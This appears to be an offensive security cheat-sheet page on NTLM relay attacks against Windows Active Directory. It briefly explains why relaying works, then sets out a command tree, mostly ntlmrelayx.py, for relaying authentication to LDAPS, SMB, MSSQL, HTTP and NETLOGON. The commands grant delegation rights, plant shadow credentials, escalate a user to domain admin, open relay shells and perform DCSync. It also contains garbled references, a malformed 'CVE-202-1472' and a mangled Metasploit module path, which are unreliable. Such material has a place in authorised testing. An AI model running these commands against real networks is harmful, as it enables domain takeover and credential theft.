# NTLM Relay

Rather than cracking a captured NetNTLM response, relay it. The authentication is valid at whatever service you forward it to, so a coerced machine account can be relayed to LDAP to grant delegation rights, or to SMB for code execution.

## Why It Works

NTLM authentication is not bound to the service it was intended for unless signing or channel binding is enforced. Where those protections are missing — and they are missing by default on LDAP — a relayed authentication is indistinguishable from a legitimate one.

## Prerequisites

* Captured or coerced authentication to forward
* A target service without SMB signing, LDAP signing, or channel binding
* The relayed account must have rights on the target

## Execution

**NTLM relay**

* **→ MS08-068 self relay**
  * `msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008` [\[tool\]](https://docs.metasploit.com/)
* `SMB -> LDAP(S)`
  * NTLMv1
    * remove mic (no CVE needed)
      * **→ see LDAP(S)**
  * NTLMv2
    * **→ Remove mic (CVE-2019-1040)**
      * **→ see LDAP(S)**
* `HTTP(S) -> LDAP(S)`
  * Usually from webdav coerce
    * **→ see LDAP(S)**
* To LDAP(S)
  * Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)
    * `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
      * **→ RBCD**
    * `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
      * **→ Shadow Credentials**
    * `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
      * **→ Domain admin**
    * `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
      * **→ LDAP SHELL**
* To SMB
  * Relay to SMB (if SMB is not signed)
    * Find SMB not signed targets (default if not a Domain controler)
      * `nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
    * `ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
      * **→ SMB Socks**
* To HTTP
  * Relay to CA web enrollement
    * **→ ESC8**
  * Relay to WSUS
    * **→ WSUS**
* To MsSQL
  * `ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
    * **→ MSSQL Socks**
* `SMB -> NETLOGON`
  * **→ Zero-Logon (safe method) (CVE-202-1472)**
    * Relay one dc to another
      * `ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
        * **→ DCSYNC**

{% hint style="info" %}
Relaying to LDAP to configure resource-based constrained delegation on the victim computer is the most reliable path — it converts one coerced authentication into full host compromise.
{% endhint %}

## Related

* [Authentication Coercion](file:///9685693/coercion-relay/authentication-coercion.md) — forcing a host to authenticate to you on demand
* [Web Enrollment Relay (ESC8)](file:///9685693/adcs/web-enrollment-relay-esc8.md) — the highest-value relay target in most domains
